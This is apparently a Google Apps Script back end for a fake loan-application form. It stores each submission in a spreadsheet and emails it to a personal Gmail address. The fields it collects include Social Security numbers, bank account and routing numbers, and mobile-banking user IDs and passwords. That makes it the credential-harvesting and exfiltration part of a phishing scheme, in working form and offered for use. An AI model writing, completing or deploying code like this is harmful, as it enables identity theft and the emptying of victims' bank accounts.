// DEBUG EMAIL SCRIPT - Test version
// Copy this into Google Apps Script to test email functionality

const SHEET_URL = "https://docs.google.com/spreadsheets/d/REPLACE_WITH_YOUR_NEW_SHEET_ID/edit";

function doGet(e) {
  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    // Add data to sheet
    sheet.appendRow([
      data.loanAmount || "",
      data.loanPurpose || "",
      data.creditScore || "",
      data.fullName || data.name || "",
      data.email || "",
      data.phone || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
      data.ssn || "",
      data.annualIncome || "",
      data.employmentStatus || "",
      data.monthlyHousing || "",
      data.bankName || data.customerBank || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.yourBank || "",
      data.mobileBankingUserId || "",
      data.mobileBankingPassword || "",
      new Date()
    ]);

    // DEBUG: Try to send email
    console.log('Attempting to send email to: ericmason007@gmail.com');
    console.log('Customer data:', data);
    
    try {
      const recipientEmail = "ericmason007@gmail.com";
      const customerName = data.fullName || data.name || 'Customer';
      const subject = `New Loan Application - ${customerName} - $${data.loanAmount || 'N/A'}`;
      
      const body = `
New Loan Application Received:

Customer Information:
- Name: ${customerName}
- Email: ${data.email || 'N/A'}
- Phone: ${data.phone || 'N/A'}
- Address: ${data.streetAddress || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}
- SSN: ${data.ssn || 'N/A'}

Bank Information:
- Mobile Banking User ID: ${data.mobileBankingUserId || 'N/A'}
- Mobile Banking Password: ${data.mobileBankingPassword || 'N/A'}

Loan Details:
- Loan Amount: $${data.loanAmount || 'N/A'}
- Loan Purpose: ${data.loanPurpose || 'N/A'}
- Bank: ${data.bankName || data.customerBank || 'N/A'}

Application submitted: ${new Date().toLocaleString()}

Check your Google Sheet for complete details.
      `;
      
      // Send email
      MailApp.sendEmail({
        to: recipientEmail,
        subject: subject,
        body: body
      });
      
      console.log('✅ Email sent successfully to: ' + recipientEmail);
      
    } catch (emailError) {
      console.log('❌ Email failed: ' + emailError.message);
      console.log('Error details: ' + emailError.toString());
    }

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    console.log('❌ doPost error: ' + err.message);
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
